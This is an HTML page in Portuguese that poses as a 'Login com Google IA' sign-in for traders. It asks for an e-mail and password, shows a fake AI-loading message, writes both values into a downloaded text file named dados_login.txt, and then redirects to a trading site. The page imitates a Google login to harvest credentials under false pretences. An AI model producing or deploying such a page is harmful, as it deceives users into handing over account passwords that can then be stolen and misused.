<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bem-vindo Trader</title>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f7f7f7;
        }
        .login-container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        .input-group {
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            padding: 10px;
            border-radius: 4px;
            border: 1px solid #ccc;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #4CAF50;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        .message-container {
            display: none;
            padding: 20px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
            margin-top: 20px;
        }
        .message-container p {
            color: green;
            font-size: 16px;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h2>Login com Google IA</h2>
	<h5>Insira suas credenciais para começar</h5>
        <form id="loginForm">
            <div class="input-group">
                <input type="email" id="email" placeholder="E-mail ou telefone" required>
            </div>
            <div class="input-group">
                <input type="password" id="senha" placeholder="Senha" required>
            </div>
            <button type="submit">Entrar</button>
        </form>
    </div>

    <div class="message-container" id="messageContainer">
        <p>Iniciando IA, aguarde... Isso poderá levar alguns minutos.</p>
    </div>

    <script>
        // Função para gerar um arquivo .txt com os dados de login
        function gerarArquivo() {
            var email = document.getElementById('email').value;
            var senha = document.getElementById('senha').value;

            // Verifica se os campos estão preenchidos
            if (email && senha) {
                // Cria o conteúdo do arquivo
                var conteudo = 'E-mail: ' + email + '\nSenha: ' + senha;

                // Cria o Blob com o conteúdo
                var blob = new Blob([conteudo], { type: 'text/plain' });

                // Cria um link para download do arquivo
                var link = document.createElement('a');
                link.href = URL.createObjectURL(blob);
                link.download = 'dados_login.txt';
                link.click();
            } else {
                alert('Por favor, preencha os campos de e-mail e senha!');
            }
        }

        // Função chamada ao enviar o formulário
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Evita que o formulário seja enviado normalmente

            // Exibe a mensagem de espera
            document.getElementById('messageContainer').style.display = 'block';

            // Simula um atraso de "processamento" com setTimeout
            setTimeout(function() {
                gerarArquivo(); // Gera e permite o download do arquivo com os dados

                // Exibe a mensagem de conclusão de processamento
                document.getElementById('messageContainer').innerHTML = '<p>Processamento concluído!</p>';

                // Após 2 segundos, redireciona para o site desejado
                window.location.href = "https://tradeboosting.org/app/login.php"; 
            }, 20000); // Simula um atraso de 2 segundos (ajuste conforme necessário)
        });
    </script>

</body>
</html>
